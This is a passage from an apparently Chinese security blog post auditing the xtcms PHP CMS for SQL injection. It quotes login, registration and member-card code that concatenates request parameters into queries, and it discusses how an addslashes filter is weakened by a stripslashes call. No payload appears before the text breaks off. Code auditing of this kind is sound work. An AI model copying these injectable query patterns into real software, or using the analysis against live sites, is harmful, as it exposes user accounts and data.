comment\">//获取会员卡信息</span>\n<span class=\"token variable\">$card</span><span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_userka where id=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cardid'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row2</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$card</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$day</span><span class=\"token operator\">=</span><span class=\"token variable\">$row2</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'day'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//天数</span>\n<span class=\"token variable\">$userid</span><span class=\"token operator\">=</span><span class=\"token variable\">$row2</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'userid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//会员组</span>\n<span class=\"token variable\">$jifen</span><span class=\"token operator\">=</span><span class=\"token variable\">$row2</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'jifen'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//积分</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//判定会员组</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_group'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span class=\"token variable\">$userid</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n<span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'您现在所属会员组的权限制大于等于目标会员组权限值，不需要升级!'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'mingxi.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>看这一处代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$card</span><span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_userka where id=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cardid'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>不难发现这里的Select语句中的参数被双引号包裹了，而开头包含了<code>inc.php</code>文件，之前就已经查看过，这个文件包含了四个文件，其中一个文件中有<code>addslashes_deep</code>函数，对传入的参数中的特殊字符(如<code>&#39;</code>,<code>&quot;</code>,<code>\\</code>)进行了转义，因此我们这里的话无法通过闭合双引号达到SQL注入的目的，同文件的其他SQL注入处也是如此，这里不再展示</p>\n<h3 id=\"wap-login-php\"><a href=\"#wap-login-php\" class=\"headerlink\" title=\"wap/login.php\"></a>wap/login.php</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151880.png\" alt=\"在这里插入图片描述\"><br>扫出login.php中存在多个可控变量，我们使用Seay来看一下具体代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//展示的仅为一部分\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$op</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'op'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'请输入用户名'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'请输入密码'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$u_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$u_password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$u_name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and u_password = \"'</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u_password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and u_status=1'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span> <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t\n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_loginnum'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_loginnum'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> \n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_loginip'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_logintime'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'y-m-d h:i:s'</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_end'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$u_end</span><span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_end'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token variable\">$u_end</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_flag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"0\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_start'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_end'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_group'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_flag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"u_flag\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_start'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"u_start\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_end'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"u_end\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_group'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"u_group\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'update xtcms_user set '</span><span class=\"token operator\">.</span><span class=\"token function\">arrtoupdate</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' where u_id =\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user_group'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_group'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'brand1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> \n<span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'user_name'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">3600</span> <span class=\"token operator\">*</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">365</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'user_password'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">3600</span> <span class=\"token operator\">*</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">365</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> \n\t\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'location:user.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'用户名或密码错误或者尚未激活'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'login.php?op=login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'reg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 检测用户名是否存在</span>\n<span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select u_id from xtcms_user where u_name='<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$query</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;script>alert(\"用户名已存在，请换个其他的用户名\");window.history.go(-1);&lt;/script>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_email = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'email'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;script>alert(\"邮箱已存在，请换个其他的邮箱\");window.history.go(-1);&lt;/script>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$email</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'email'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$regtime</span> <span class=\"token operator\">=</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$token</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token operator\">.</span><span class=\"token variable\">$password</span><span class=\"token operator\">.</span><span class=\"token variable\">$regtime</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//创建用于激活识别码</span>\n<span class=\"token variable\">$token_exptime</span> <span class=\"token operator\">=</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">60</span><span class=\"token operator\">*</span><span class=\"token number\">60</span><span class=\"token operator\">*</span><span class=\"token number\">24</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//过期时间为24小时后</span>\n<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_name'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_password'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_email'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$email</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_regtime'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token variable\">$regtime</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xtcms_mail</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_status'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_status'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_group'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_fav'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_plays'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_downs'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//推广注册</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_qid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_id=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token variable\">$u_points</span><span class=\"token operator\">=</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u_points'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>不难发现这里的SELECT语句有以下几个</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$u_name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and u_password = \"'</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u_password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and u_status=1'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$query</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select u_id from xtcms_user where u_name='<span class=\"token interpolation\"><span class=\"token variable\">$username</span></span>'\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_email = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'email'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_id=\"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>但文件开头就声明包含了<code>inc.php</code>文件，说明这里的话包含了过滤函数，也就是对SQL注入是有防护的，对<code>&#39;</code>、<code>&quot;</code>以及<code>\\</code>都进行了转义，因此这里如果参数是被单引号或者双引号包裹的话，那么这里极有可能算是G了，我们看第一个，也就是</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'select * from xtcms_user where u_name = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$u_name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and u_password = \"'</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u_password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and u_status=1'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>它这个不难发现，<code>$u_name</code>和<code>$u_password</code>都被双引号包裹了，因此这里就不存在SQL注入了。但是看一下第二个，第二个的<code>username</code>参数虽然是被双引号进行包裹了，但你会发现这个参数的传值方式是<code>$username = 